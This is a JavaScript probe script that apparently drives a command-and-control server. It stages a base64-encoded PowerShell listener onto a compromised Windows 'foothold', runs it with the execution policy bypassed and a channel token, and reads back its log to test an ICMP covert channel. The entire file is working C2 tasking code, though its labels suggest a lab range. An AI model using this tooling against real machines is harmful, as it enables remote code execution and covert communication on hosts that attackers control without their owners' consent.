// probe-listen-guest.mjs — stages + runs guest-icmp-listen.ps1 on the live foothold and
// prints its log: does the channel's echo-reply reach the guest's raw socket?
const API = 'http://127.0.0.1:8971';
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const { readFileSync } = await import('node:fs');
const FOOTHOLD = process.argv[2];

const ch = await (await fetch(API + '/api/channel')).json();
const a = FOOTHOLD ? (ch.agents || []).find((x) => x.agentId === FOOTHOLD) : (ch.agents || []).find((x) => x.label === 'win11-range-foothold' && x.health === 'active');
if (!a) { console.log('NO-ACTIVE-FOOTHOLD'); process.exit(1); }
console.log('foothold:', a.agentId, 'checkins', a.checkins);
const reg = await (await fetch(API + '/api/channel/agent', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ action: 'register', label: 'listen-probe' }) })).json();
console.log('probe identity:', reg.agentId);
const b64 = readFileSync(new URL('./guest-icmp-listen.ps1', import.meta.url)).toString('base64');
const st = await (await fetch(API + '/api/channel/stage', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ agentId: a.agentId, name: 'guest-icmp-listen.ps1', b64 }) })).json();
const waitTask = async (tid, s) => {
  for (let i = 0; i < s / 2; i++) {
    await sleep(2000);
    const { tasks } = await (await fetch(API + '/api/channel/tasks?agent=' + a.agentId)).json();
    const x = (tasks || []).find((y) => y.taskId === tid);
    if (x && x.status === 'resulted') return x.resultPreview;
  }
  return null;
};
console.log('staged:', await waitTask(st.taskId, 30));
const cmd = 'powershell -NoProfile -ExecutionPolicy Bypass -File C:\\Windows\\System32\\agentbox\\guest-icmp-listen.ps1 -AgentId ' + reg.agentId + ' -Token ' + reg.token + ' > C:\\Windows\\Temp\\icmp-listen.log 2>&1';
const t = await (await fetch(API + '/api/channel/task', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ agentId: a.agentId, kind: 'shell', data: cmd }) })).json();
console.log('listen task:', await waitTask(t.taskId, 45));
const t2 = await (await fetch(API + '/api/channel/task', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ agentId: a.agentId, kind: 'shell', data: 'type C:\\Windows\\Temp\\icmp-listen.log' }) })).json();
console.log('LISTEN LOG:', JSON.stringify(await waitTask(t2.taskId, 30)));
